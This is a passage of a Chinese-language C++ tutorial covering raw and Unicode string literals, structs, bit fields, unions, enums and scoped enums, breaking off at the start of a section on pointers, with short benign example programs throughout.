4.3.5 其他形式的字符串字面值C++11 引入了新的字符串字面值形式，提供了对不同字符编码（如 Unicode）的更好支持。 原始字符串字面值 (Raw String Literal): 语法: R&quot;delimiter(raw_characters)delimiter&quot; delimiter 是一个可选的、最多16个字符的序列（不能包含空格、括号、反斜杠）。 raw_characters 是字符串内容，其中的反斜杠 \\ 和引号 &quot; 等特殊字符不会被转义，按原样解释。 主要用于书写包含大量特殊字符的字符串，如正则表达式、文件路径、HTML/XML代码等，避免大量的反斜杠转义。 示例: R&quot;(C:\\Program Files\\)&quot;, R&quot;delimiter(String with &quot;quotes&quot; and \\backslashes)delimiter&quot; Unicode 字符串字面值: u8&quot;string&quot;: UTF-8 编码的字符串 (类型是 const char[]，但应存储在 std::string 或处理 UTF-8 的地方)。 u&quot;string&quot;: UTF-16 编码的字符串 (类型是 const char16_t[])。 U&quot;string&quot;: UTF-32 编码的字符串 (类型是 const char32_t[])。 用法与示例: 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // 原始字符串字面值 std::string path1 = &quot;C:\\\\Program Files\\\\My App\\\\&quot;; // 需要转义反斜杠 std::string path2 = R&quot;(C:\\Program Files\\My App\\)&quot;; // 使用原始字符串，无需转义 std::string regex = R&quot;(\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]&#123;2,&#125;\\b)&quot;; // 正则表达式 std::string html = R&quot;delimiter(&lt;html&gt; &lt;head&gt;&lt;title&gt;Raw String&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;p&gt;&quot;Hello!&quot;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;)delimiter&quot;; std::cout &lt;&lt; &quot;Path 1: &quot; &lt;&lt; path1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Path 2: &quot; &lt;&lt; path2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Regex: &quot; &lt;&lt; regex &lt;&lt; std::endl; std::cout &lt;&lt; &quot;HTML:\\n&quot; &lt;&lt; html &lt;&lt; std::endl; // Unicode 字符串字面值 (主要用于需要特定编码的场景) const char* utf8_str = u8&quot;你好，世界&quot;; // UTF-8 (需要支持 UTF-8 的环境/终端才能正确显示) const char16_t* utf16_str = u&quot;你好，世界&quot;; // UTF-16 const char32_t* utf32_str = U&quot;你好，世界&quot;; // UTF-32 std::cout &lt;&lt; &quot;UTF-8 String (may not display correctly): &quot; &lt;&lt; utf8_str &lt;&lt; std::endl; // 处理和打印 UTF-16/32 通常需要专门的库或函数 // std::cout &lt;&lt; utf16_str; // 不能直接用 cout 打印 char16_t* / char32_t* return 0;&#125; 原始字符串字面值在处理包含特殊字符的文本时非常方便。Unicode 字符串字面值则为处理国际化文本提供了标准化的基础。 4.4 结构简介数组允许我们存储多个相同类型的数据。但有时我们需要将不同类型的数据组合成一个单一的、有意义的单元。例如，描述一件商品可能需要商品名称（字符串）、数量（整数）和单价（浮点数）。C++ 的结构 (Structure) 就提供了这种能力。 结构是一种用户定义的复合类型，它允许将多个不同类型的数据项（称为成员 (member) 或**字段 (field)**）捆绑在一起，形成一个新的数据类型。 4.4.1 在程序中使用结构使用结构通常涉及以下步骤： 定义结构: 使用 struct 关键字定义一个新的结构类型，并在花括号 &#123;&#125; 内声明其成员。结构定义通常放在 main() 函数之前或单独的头文件中。 声明结构变量: 使用定义好的结构类型名来声明变量。 访问结构成员: 使用成员运算符（点运算符 .) 来访问结构变量的特定成员。 结构定义语法: 12345struct StructureName &#123; memberType1 memberName1; memberType2 memberName2; // ... more members&#125;; // 注意定义末尾的分号 用法与示例: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt; // 为了使用 string// 1. 定义结构: 描述充气产品的结构体struct Inflatable &#123; std::string name; // 商品名称 (string 类型成员) float volume; // 体积 (float 类型成员) double price; // 价格 (double 类型成员)&#125;;int main() &#123; // 2. 声明结构变量 Inflatable product1; // 声明一个 Inflatable 类型的变量 product1 Inflatable product2; // 声明另一个 Inflatable 类型的变量 product2 // 3. 访问并赋值结构成员 product1.name = &quot;Awesome Air Mattress&quot;; product1.volume = 1.8f; product1.price = 49.99; // 也可以在声明时进行初始化 (C++98/03 风格，需要按顺序) Inflatable product3 = &#123;&quot;Giant Swan Floatie&quot;, 2.5f, 79.95&#125;; // 访问并输出成员 std::cout &lt;&lt; &quot;Product 1 Name: &quot; &lt;&lt; product1.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 1 Price: $&quot; &lt;&lt; product1.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 3 Name: &quot; &lt;&lt; product3.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 3 Volume: &quot; &lt;&lt; product3.volume &lt;&lt; &quot; cubic meters&quot; &lt;&lt; std::endl; // 结构变量之间可以直接赋值 (成员逐个复制) product2 = product1; std::cout &lt;&lt; &quot;Product 2 Name (after assignment): &quot; &lt;&lt; product2.name &lt;&lt; std::endl; return 0;&#125; struct Inflatable &#123; ... &#125;;: 定义了一个名为 Inflatable 的新类型。 Inflatable product1;: 创建了一个 Inflatable 类型的变量（对象）。 product1.name = ...;: 使用点运算符访问 product1 的 name 成员并赋值。 4.4.2 C++11结构初始化C++11 引入的列表初始化（花括号初始化）也适用于结构体，提供了更灵活、更安全的初始化方式。 特点: 可以省略等号 =: 与数组类似，可以在初始化时省略等号。 可以按成员顺序初始化: StructType var &#123;value1, value2, ...&#125;; 可以初始化部分成员 (C++20 designated initializers): C++20 允许通过指定成员名进行初始化，可以不按顺序或只初始化部分成员。但在 C++11/14/17 中，通常需要按顺序提供值。 空花括号初始化: StructType var &#123;&#125;; 会将所有成员进行零初始化（数值类型为0，指针为 nullptr，bool 为 false，类类型会调用默认构造函数）。 禁止缩窄转换: 与数组一样，列表初始化不允许可能丢失信息的缩窄转换。 用法与示例: 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;struct Product &#123; std::string id; int quantity; double price;&#125;;int main() &#123; // C++11 列表初始化 (省略等号) Product item1 &#123; &quot;A123&quot;, 50, 19.95 &#125;; // 按顺序初始化所有成员 // 省略等号，部分初始化 (C++11/14/17 中，未提供的成员会被值初始化/零初始化) // 注意：这种部分初始化对于包含 std::string 等类类型成员时，行为依赖于这些类的默认构造函数 // Product item2 &#123; &quot;B456&quot;, 100 &#125;; // price 会被零初始化为 0.0 // 空花括号进行零初始化 Product item3 &#123;&#125;; // id 为空字符串, quantity 为 0, price 为 0.0 std::cout &lt;&lt; &quot;Item 1 ID: &quot; &lt;&lt; item1.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item1.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item1.price &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Item 2 ID: &quot; &lt;&lt; item2.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item2.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item2.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Item 3 ID: \\&quot;&quot; &lt;&lt; item3.id &lt;&lt; &quot;\\&quot;, Qty: &quot; &lt;&lt; item3.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item3.price &lt;&lt; std::endl; // 禁止缩窄转换 // Product item_error &#123; &quot;C789&quot;, 10.5, 25.0 &#125;; // 错误! 10.5 (double) 到 int 是缩窄转换 // C++20 Designated Initializers (如果编译器支持 C++20) // Product item4 &#123; .id = &quot;D001&quot;, .price = 99.99 &#125;; // quantity 会被零初始化 // std::cout &lt;&lt; &quot;Item 4 ID: &quot; &lt;&lt; item4.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item4.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item4.price &lt;&lt; std::endl; return 0;&#125; 4.4.3 结构可以将string类作为成员吗是的，绝对可以。 正如在 4.4.1 和 4.4.2 的示例中看到的 (Inflatable 和 Product 结构)，std::string 对象可以像 int、double 或其他任何类型一样作为结构的成员。 这使得结构能够方便地包含文本信息，并利用 string 类提供的所有功能（自动内存管理、拼接、查找等）。 示例回顾: 1234567891011121314151617181920#include &lt;string&gt;struct Student &#123; std::string name; // string 成员 int studentID; double gpa;&#125;;int main() &#123; Student s1 &#123; &quot;Alice Wonderland&quot;, 12345, 3.8 &#125;; Student s2; s2.name = &quot;Bob The Builder&quot;; // 可以像普通 string 一样操作 s2.studentID = 67890; s2.gpa = 3.5; std::cout &lt;&lt; s1.name &lt;&lt; &quot; has GPA: &quot; &lt;&lt; s1.gpa &lt;&lt; std::endl; std::cout &lt;&lt; s2.name &lt;&lt; &quot; has ID: &quot; &lt;&lt; s2.studentID &lt;&lt; std::endl; return 0;&#125; 4.4.4 其他结构属性结构在 C++ 中具有一些方便的属性： 赋值 (Assignment): 可以使用赋值运算符 = 将一个结构变量的值赋给同类型的另一个结构变量。这会执行**成员逐一复制 (memberwise copy)**，即将源结构每个成员的值复制到目标结构对应成员中。 123Student s1 = &#123;&quot;Charlie&quot;, 111, 3.9&#125;;Student s2;s2 = s1; // s2 的 name, studentID, gpa 都被设置为 s1 的值 作为函数参数 (Pass by Value): 可以将结构变量按值传递给函数。函数会收到结构的一个副本，对副本成员的修改不会影响原始结构变量。 1234567void displayStudent(Student s) &#123; // s 是传入结构的一个副本 std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; s.studentID &lt;&lt; &quot;, Name: &quot; &lt;&lt; s.name &lt;&lt; std::endl; s.name = &quot;Changed&quot;; // 只修改副本&#125;// ...displayStudent(s1); // 传递 s1 的副本std::cout &lt;&lt; s1.name; // 输出 &quot;Charlie&quot;，未被改变 作为函数参数 (Pass by Reference/Pointer): 为了避免复制整个结构的开销，或者需要在函数中修改原始结构，通常按引用或指针传递结构。 123456789void updateGPA(Student&amp; s, double newGPA) &#123; // 按引用传递，可以修改原始结构 s.gpa = newGPA;&#125;void printID(const Student* sPtr) &#123; // 按指针传递 (const 防止意外修改) std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; sPtr-&gt;studentID &lt;&lt; std::endl; // 使用 -&gt; 访问指针指向的结构成员&#125;// ...updateGPA(s1, 4.0); // 修改原始 s1printID(&amp;s1); // 传递 s1 的地址 作为函数返回值: 函数可以返回一个结构。 123456789Student createStudent(std::string name, int id, double gpa) &#123; Student temp; temp.name = name; temp.studentID = id; temp.gpa = gpa; return temp; // 返回一个 Student 结构&#125;// ...Student s3 = createStudent(&quot;David&quot;, 222, 3.7); 这些特性使得结构成为组织和传递相关数据的强大工具。 4.4.5 结构数组可以创建**结构数组 (Array of Structures)**，即数组的每个元素都是一个结构变量。这对于处理一组具有相同结构的数据非常有用，例如一个班级的学生信息、一个商店的库存列表等。 声明和初始化: 声明结构数组与声明普通数组类似，只是元素类型是结构类型。初始化可以使用嵌套的花括号。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string&gt;struct Student &#123; std::string name; int studentID;&#125;;const int CLASS_SIZE = 3;int main() &#123; // 声明一个包含 CLASS_SIZE 个 Student 结构的数组 Student classRoster[CLASS_SIZE]; // 初始化结构数组 (使用嵌套花括号) Student graduates[2] = &#123; &#123;&quot;Alice&quot;, 101&#125;, // 初始化 graduates[0] &#123;&quot;Bob&quot;, 102&#125; // 初始化 graduates[1] &#125;; // C++11 列表初始化 Student freshmen[CLASS_SIZE] &#123; &#123;&quot;Charlie&quot;, 201&#125;, &#123;&quot;David&quot;, 202&#125;, &#123;&quot;Eve&quot;, 203&#125; &#125;; // 访问结构数组中的元素及其成员 classRoster[0].name = &quot;Frank&quot;; classRoster[0].studentID = 301; std::cout &lt;&lt; &quot;Graduate 1: &quot; &lt;&lt; graduates[0].name &lt;&lt; &quot; (ID: &quot; &lt;&lt; graduates[0].studentID &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Freshman 3 ID: &quot; &lt;&lt; freshmen[2].studentID &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Roster 1 Name: &quot; &lt;&lt; classRoster[0].name &lt;&lt; std::endl; // 遍历结构数组 std::cout &lt;&lt; &quot;\\nFreshmen List:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; CLASS_SIZE; ++i) &#123; std::cout &lt;&lt; &quot; - &quot; &lt;&lt; freshmen[i].name &lt;&lt; &quot; (ID: &quot; &lt;&lt; freshmen[i].studentID &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; &#125; return 0;&#125; Student classRoster[CLASS_SIZE];: 声明了一个数组，每个元素都是 Student 结构。 graduates[0] = &#123;&quot;Alice&quot;, 101&#125;;: 初始化数组的第一个元素（一个 Student 结构）。 freshmen[i].name: 访问数组 freshmen 中索引为 i 的元素的 name 成员。 4.4.6 结构中的位字段位字段 (Bit Field) 是一种特殊的结构成员，它允许你指定成员变量占用的**位数 (bits)**。这主要用于需要精确控制内存布局或与硬件寄存器交互的场景。 语法: 在结构定义中，成员名后面跟一个冒号 : 和一个整数常量，表示该成员占用的位数。 1234567struct RegisterFlags &#123; unsigned int readEnable : 1; // 占用 1 位 unsigned int writeEnable : 1; // 占用 1 位 unsigned int mode : 2; // 占用 2 位 unsigned int reserved : 4; // 占用 4 位 (通常用于填充或对齐) // ...&#125;; 特点和注意事项: 类型: 位字段的类型通常是 unsigned int 或 signed int（或 int，其符号性取决于实现），也可以是 bool (C++11，等效于 : 1)。 内存节省: 当多个标志或小范围数值需要存储时，位字段可以显著节省内存，将它们打包到单个整数或几个字节中。 硬件接口: 常用于映射硬件设备寄存器的特定位。 访问: 像普通结构成员一样使用点运算符访问，但不能获取位字段的地址（&amp; 运算符不能用于位字段）。 可移植性: 位字段的内存布局（位的排列顺序、跨字节边界的处理）可能因编译器和平台而异，因此在需要跨平台兼容性的代码中应谨慎使用。 大小限制: 位数不能超过其基础类型的位数（例如，unsigned int 的位字段不能超过 int 的位数）。 匿名位字段: 可以使用未命名的位字段来填充或对齐，例如 unsigned int : 2;。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;// 假设用于控制某个设备的状态struct DeviceStatus &#123; // 打包到单个字节 (假设 unsigned int 至少 8 位) unsigned int powerOn : 1; unsigned int errorFlag : 1; unsigned int channel : 3; // 可以表示 0-7 unsigned int : 3; // 填充未使用的 3 位，使总共 8 位&#125;;int main() &#123; DeviceStatus status; // 设置位字段的值 status.powerOn = 1; // 设备开机 status.errorFlag = 0; // 无错误 status.channel = 5; // 设置通道为 5 // 读取位字段的值 std::cout &lt;&lt; &quot;Device Status:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Power On: &quot; &lt;&lt; status.powerOn &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Error Flag: &quot; &lt;&lt; status.errorFlag &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Channel: &quot; &lt;&lt; status.channel &lt;&lt; std::endl; // 位字段通常打包存储 std::cout &lt;&lt; &quot;Size of DeviceStatus struct: &quot; &lt;&lt; sizeof(DeviceStatus) &lt;&lt; &quot; byte(s)&quot; &lt;&lt; std::endl; // 输出通常是 1 或 4 (取决于编译器如何对齐和打包，以及 int 的大小) // 检查特定标志 if (status.powerOn) &#123; std::cout &lt;&lt; &quot;Device is powered on.&quot; &lt;&lt; std::endl; &#125; // 不能获取位字段地址 // unsigned int* pPower = &amp;status.powerOn; // 错误! return 0;&#125; 位字段是一种底层工具，适用于特定场景，但在常规应用程序开发中不常用。 4.5 共用体共用体 (Union) 是一种特殊的数据结构，它也允许在一个结构中存储不同的数据类型，但与结构体 (struct) 不同的是，共用体的所有成员共享同一块内存空间。 核心特点: 内存共享: 共用体的大小由其最大的成员的大小决定。所有成员都从相同的内存地址开始存储。 同一时间只有一个成员有效: 在任何时刻，你只能有效地存储和使用共用体中的一个成员的值。当你给一个成员赋值时，可能会覆盖掉其他成员的数据。 节省内存: 当你需要存储多种类型的数据，但知道在任何时候只需要用到其中一种时，共用体可以节省内存，因为它只需要分配足够容纳最大成员的空间。 定义共用体: 使用 union 关键字定义，语法与 struct 类似。 12345union UnionName &#123; memberType1 memberName1; memberType2 memberName2; // ... more members&#125;; // 注意定义末尾的分号 访问成员: 与结构体一样，使用成员运算符（点运算符 .) 来访问共用体变量的成员。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;// 定义一个共用体，可以存储 int, long 或 doubleunion DataValue &#123; int i_val; long l_val; double d_val;&#125;;int main() &#123; DataValue data; // 声明一个 DataValue 共用体变量 std::cout &lt;&lt; &quot;Size of DataValue union: &quot; &lt;&lt; sizeof(DataValue) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // 输出的大小通常等于 sizeof(double)，因为它是最大的成员 // 存储并使用 int 成员 data.i_val = 100; std::cout &lt;&lt; &quot;Stored as int: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // 此时访问 l_val 或 d_val 的结果是未定义的/无意义的 // 存储并使用 double 成员 (会覆盖之前的 int 值) data.d_val = 3.14159; std::cout &lt;&lt; &quot;Stored as double: &quot; &lt;&lt; data.d_val &lt;&lt; std::endl; // 此时访问 i_val 或 l_val 的结果是未定义的/无意义的 // std::cout &lt;&lt; &quot;Reading i_val after storing double: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // 结果不可靠 // 存储并使用 long 成员 (会覆盖之前的 double 值) data.l_val = 1234567890L; std::cout &lt;&lt; &quot;Stored as long: &quot; &lt;&lt; data.l_val &lt;&lt; std::endl; // --- 追踪当前有效成员 --- // 通常需要一个额外的变量来记录当前哪个成员是有效的 enum DataType &#123; INT, LONG, DOUBLE &#125;; struct DataPacket &#123; DataType type; // 记录当前存储的数据类型 DataValue value; // 共用体存储实际值 &#125;; DataPacket packet; packet.type = INT; packet.value.i_val = 255; // 根据类型访问 if (packet.type == INT) &#123; std::cout &lt;&lt; &quot;Packet contains int: &quot; &lt;&lt; packet.value.i_val &lt;&lt; std::endl; &#125; // ... 其他类型的检查 return 0;&#125; 重要: 程序员有责任跟踪共用体中当前哪个成员是活动的（有效的）。读取非活动成员的值会导致未定义行为或得到无意义的数据。通常会结合一个枚举类型或整数标志来指示当前存储的数据类型，如 DataPacket 示例所示。 匿名共用体 (Anonymous Union): 共用体可以不带名称直接定义在结构体或类内部（或函数局部作用域）。匿名共用体的成员可以直接通过结构/类变量访问，就像它们是结构/类的直接成员一样。匿名共用体的所有成员仍然共享相同的内存。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;struct Widget &#123; char type; // &#x27;I&#x27; for integer, &#x27;F&#x27; for float union &#123; // 匿名共用体 int intVal; float floatVal; &#125;; // 注意这里没有变量名&#125;;int main() &#123; Widget w; w.type = &#x27;I&#x27;; w.intVal = 123; // 直接访问匿名共用体的成员 if (w.type == &#x27;I&#x27;) &#123; std::cout &lt;&lt; &quot;Widget value (int): &quot; &lt;&lt; w.intVal &lt;&lt; std::endl; &#125; else if (w.type == &#x27;F&#x27;) &#123; // w.floatVal = 3.14f; // 如果要存 float // std::cout &lt;&lt; &quot;Widget value (float): &quot; &lt;&lt; w.floatVal &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Size of Widget: &quot; &lt;&lt; sizeof(Widget) &lt;&lt; std::endl; // 大小通常是 char 的大小 + 最大成员(int 或 float)的大小 + 可能的对齐填充 return 0;&#125; 使用场景: 节省内存: 当数据项有多种可能类型，但一次只使用一种时。 类型双关 (Type Punning): 以不同的类型解释同一块内存区域（例如，将一个 float 的位模式解释为一个 int）。这是一种低级技巧，通常不可移植且可能违反 C++ 的严格别名规则 (strict aliasing rules)，应谨慎使用或避免。 与结构的比较: 内存: 结构的所有成员都有自己独立的内存地址；共用体的所有成员共享起始地址。 大小: 结构的大小约等于其所有成员大小之和（加上可能的对齐填充）；共用体的大小等于其最大成员的大小。 有效性: 结构的所有成员可以同时有效；共用体只有一个成员能同时有效。 C++11 及以后的共用体: C++11 放宽了对共用体成员类型的限制，允许包含具有非平凡构造函数、析构函数或赋值运算符的类类型成员（如 std::string）。但是，如果共用体包含这样的成员，编译器不会自动生成默认的构造函数、析构函数或复制/移动操作。程序员必须手动管理这些成员的生命周期（例如，使用 placement new 在共用体内存上构造对象，并在不再需要时显式调用析构函数）。这使得包含复杂类型的共用体使用起来更加复杂和易错。对于只包含 POD (Plain Old Data) 类型（如 int, float, 指针, C 风格数组/结构）的共用体，其行为与 C 语言中类似。 4.6 枚举C++ 的 enum 工具提供了一种创建符号常量 (Symbolic Constant) 的方式，常用于定义一组相关的、具有名称的整数常量。这比使用 const int 或 #define 来定义一组相关常量更方便、更具可读性。 基本概念: 枚举类型 (Enumeration Type): enum 关键字用于创建一个新的用户定义的整数类型。 枚举量 (Enumerator): 在枚举类型定义中列出的标识符。它们是具名的常量，代表整数值。 定义枚举: 使用 enum 关键字，后跟枚举类型的名称，然后在花括号 &#123;&#125; 内列出枚举量，用逗号分隔。 1enum spectrum &#123;red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;; 工作原理: 创建新类型: 上述语句创建了一个名为 spectrum 的新类型。 定义枚举量: red, orange, yellow 等成为 spectrum 类型的符号常量。 自动赋值: 默认情况下，编译器将整数值赋给枚举量，从 0 开始，依次递增 1。 red 值为 0 orange 值为 1 yellow 值为 2 … ultraviolet 值为 7 声明和使用枚举变量: 可以像使用其他类型一样声明枚举类型的变量。枚举变量通常只能被赋予该枚举类型中定义的枚举量。 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;enum spectrum &#123;red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;int main() &#123; spectrum band; // 声明一个 spectrum 类型的变量 band band = blue; // 将枚举量 blue 赋给 band (合法) std::cout &lt;&lt; &quot;Current band (enum value): &quot; &lt;&lt; band &lt;&lt; std::endl; // 输出 blue 对应的整数值 5 // band = 2000; // 错误! 不能直接将整数赋给枚举变量 (类型不匹配) // band = red + orange; // 错误! + 运算符未对枚举类型定义 (虽然 red 和 orange 有整数值) // 可以将枚举量赋给 int 变量 (枚举量会自动提升为 int) int colorCode = green; std::cout &lt;&lt; &quot;Color code for green: &quot; &lt;&lt; colorCode &lt;&lt; std::endl; // 输出 3 // 可以强制将 int 转换为枚举类型 (需要显式转换，且需谨慎) band = static_cast&lt;spectrum&gt;(3); // 将 3 转换为 spectrum 类型 (对应 green) std::cout &lt;&lt; &quot;Band after cast: &quot; &lt;&lt; band &lt;&lt; std::endl; // 输出 3 // 比较 if (band == green) &#123; std::cout &lt;&lt; &quot;The band is green.&quot; &lt;&lt; std::endl; &#125; // 在循环中使用 (需要注意类型转换和范围) for (band = red; band &lt;= ultraviolet; band = static_cast&lt;spectrum&gt;(band + 1)) &#123; std::cout &lt;&lt; &quot;Processing band: &quot; &lt;&lt; band &lt;&lt; std::endl; &#125; return 0;&#125; 枚举的优点: 提高可读性: 使用有意义的名称（如 red, blue）代替神秘的数字（0, 4）。 类型安全: 枚举创建了新的类型，有助于防止将不相关的整数值赋给枚举变量（虽然可以通过强制转换绕过）。 代码维护: 如果需要更改某个常量的值或添加新常量，只需修改枚举定义。 4.6.1 设置枚举量的值可以显式地为枚举量指定整数值。 规则: 使用赋值运算符 = 为枚举量指定值。 未被显式赋值的枚举量的值将基于前一个枚举量的值加 1。 第一个枚举量如果未显式赋值，默认为 0。 不同的枚举量可以具有相同的值。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;enum BitField &#123; BIT_ZERO, // 默认值为 0 BIT_ONE, // 默认值为 1 BIT_TWO = 4, // 显式赋值为 4 BIT_THREE, // 值为 BIT_TWO + 1 = 5 BIT_FOUR = 8, // 显式赋值为 8 BIT_FIVE = 8, // 显式赋值为 8 (与 BIT_FOUR 相同) BIT_SIX, // 值为 BIT_FIVE + 1 = 9 BIT_SEVEN = BIT_THREE + BIT_FOUR // 值为 5 + 8 = 13&#125;;int main() &#123; std::cout &lt;&lt; &quot;BIT_ZERO: &quot; &lt;&lt; BIT_ZERO &lt;&lt; std::endl; // 0 std::cout &lt;&lt; &quot;BIT_ONE: &quot; &lt;&lt; BIT_ONE &lt;&lt; std::endl; // 1 std::cout &lt;&lt; &quot;BIT_TWO: &quot; &lt;&lt; BIT_TWO &lt;&lt; std::endl; // 4 std::cout &lt;&lt; &quot;BIT_THREE: &quot; &lt;&lt; BIT_THREE &lt;&lt; std::endl; // 5 std::cout &lt;&lt; &quot;BIT_FOUR: &quot; &lt;&lt; BIT_FOUR &lt;&lt; std::endl; // 8 std::cout &lt;&lt; &quot;BIT_FIVE: &quot; &lt;&lt; BIT_FIVE &lt;&lt; std::endl; // 8 std::cout &lt;&lt; &quot;BIT_SIX: &quot; &lt;&lt; BIT_SIX &lt;&lt; std::endl; // 9 std::cout &lt;&lt; &quot;BIT_SEVEN: &quot; &lt;&lt; BIT_SEVEN &lt;&lt; std::endl; // 13 BitField flags = BIT_THREE; std::cout &lt;&lt; &quot;Flags: &quot; &lt;&lt; flags &lt;&lt; std::endl; // 5 return 0;&#125; 4.6.2 枚举的取值范围虽然枚举量是 int 类型的常量，但枚举类型本身 (spectrum, BitField 等) 的取值范围并不一定等同于 int。 C++98/03 标准: 底层类型 (Underlying Type): 编译器会选择一种能够容纳所有枚举量值的整型作为该枚举的底层类型。这个类型至少要和 int 一样大，但如果所有枚举量的值可以用更小的类型（如 char 或 short）表示，编译器可能会选择更小的类型来节省内存。 取值范围: 枚举变量理论上可以存储的值的范围由其底层类型决定。然而，C++ 标准对枚举变量可以合法持有的值有更严格的规定。一个枚举变量可以持有的值，其上限是大于最大枚举量值的最小的 2 的幂减 1，下限类似（如果存在负枚举量值，则为小于最小枚举量值的最大的 2 的幂加 1；如果枚举量都非负，则下限为 0）。 例如，对于 enum spectrum &#123;red=0, ..., ultraviolet=7&#125;，最大枚举量是 7。大于 7 的最小的 2 的幂是 8，所以上限是 8 - 1 = 7。下限是 0。因此，spectrum 变量理论上可以持有 0 到 7 范围内的值。 对于 enum BitField &#123;..., BIT_SEVEN=13&#125;，最大枚举量是 13。大于 13 的最小的 2 的幂是 16，上限是 16 - 1 = 15。下限是 0。BitField 变量理论上可以持有 0 到 15 范围内的值。 赋值限制: 尽管范围可能比枚举量的值域宽，但 C++ 通常不允许直接将超出枚举量定义范围的整数值赋给枚举变量（即使该整数在理论范围内），需要显式类型转换。 C++11 作用域内枚举 (Scoped Enumeration): C++11 引入了 enum class (或 enum struct)，称为作用域内枚举，提供了更强的类型安全和作用域控制： 强类型: enum class 的枚举量不会隐式转换为整数。 作用域: 枚举量的名称被限制在枚举类型的作用域内，访问时需要使用 EnumType::Enumerator。 可指定底层类型: 可以显式指定底层整数类型，例如 enum class Color : unsigned char &#123; Red, Green, Blue &#125;;。 无隐式转换: 不能将整数直接赋给 enum class 变量，也不能将 enum class 变量隐式转换为整数，都需要显式转换 (static_cast)。 用法与示例 (范围和 C++11): 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;enum OldEnum &#123; A = 1, B = 2, C = 4 &#125;; // 最大值 4, 范围可能是 0-7// C++11 作用域内枚举enum class NewEnum &#123; X = 10, Y = 20, Z = 30 &#125;; enum class Status : char &#123; OK = &#x27;O&#x27;, Error = &#x27;E&#x27;, Pending = &#x27;P&#x27; &#125;; // 指定底层类型为 charint main() &#123; OldEnum oe; // oe = 7; // 编译错误 (通常不允许直接赋 int) oe = static_cast&lt;OldEnum&gt;(7); // 合法 (因为 7 在理论范围 0-7 内) std::cout &lt;&lt; &quot;OldEnum value: &quot; &lt;&lt; oe &lt;&lt; std::endl; // 输出 7 // oe = static_cast&lt;OldEnum&gt;(8); // 行为未定义或可能编译错误 (超出理论范围) NewEnum ne = NewEnum::Y; // 必须使用作用域解析符 // int ne_val = ne; // 错误! 不能隐式转换为 int int ne_val = static_cast&lt;int&gt;(ne); // 需要显式转换 std::cout &lt;&lt; &quot;NewEnum value as int: &quot; &lt;&lt; ne_val &lt;&lt; std::endl; // 输出 20 // ne = 20; // 错误! 不能将 int 赋给 enum class ne = static_cast&lt;NewEnum&gt;(10); // 需要显式转换 std::cout &lt;&lt; &quot;NewEnum value after cast: &quot; &lt;&lt; static_cast&lt;int&gt;(ne) &lt;&lt; std::endl; // 输出 10 Status s = Status::OK; char s_char = static_cast&lt;char&gt;(s); // 转换为底层类型 char std::cout &lt;&lt; &quot;Status as char: &quot; &lt;&lt; s_char &lt;&lt; std::endl; // 输出 O return 0;&#125; 总结:传统的 enum 提供了一种创建命名常量的方式，但类型安全较弱，且枚举量会污染所在的作用域。C++11 的 enum class 提供了更强的类型安全和作用域控制，是现代 C++ 中更推荐的选择。在使用传统 enum 时，要注意其取值范围和与整数类型转换的规则。 4.7 指针和自由存储空间到目前为止，我们创建的变量（包括数组、结构等）在声明时，编译器会为其分配内存。这些变量的内存管理是自动的（自动存储或静态存储）。但是，有时我们需要在程序运行时根据需要动态地分配和释放内存。指针 (Pointer) 和 自由存储空间 (Free Store)**（也常称为堆 Heap**）是实现这一目标的关键。 指针是一种特殊的变量，它存储的是另一个变量的内存地址。通过指针，我们可以间接地访问和修改该内存地址处的数据。 自由存储空间是程序可以动态申请使用的内存区域。与自动变量（函数执行完就销毁）或静态变量（程序整个生命周期都存在）不同，程序员需要手动管理自由存储空间中分配的内存的生命周期。 4.7.1 声明和初始化指针声明指针: 声明指针需要指定它将指向的数据类型，并在变量名前加上星号 *（星号可以靠近类型名、变量名或在两者之间）。 1typeName * pointerName; typeName: 指针将要指向的数据的类型。 *: 表明 pointerName 是一个指针。 pointerName: 指针变量的名称。 示例: 1234int * p_int; // 声明一个指向 int 类型的指针 p_intdouble * p_double; // 声明一个指向 double 类型的指针 p_doublechar * p_char; // 声明一个指向 char 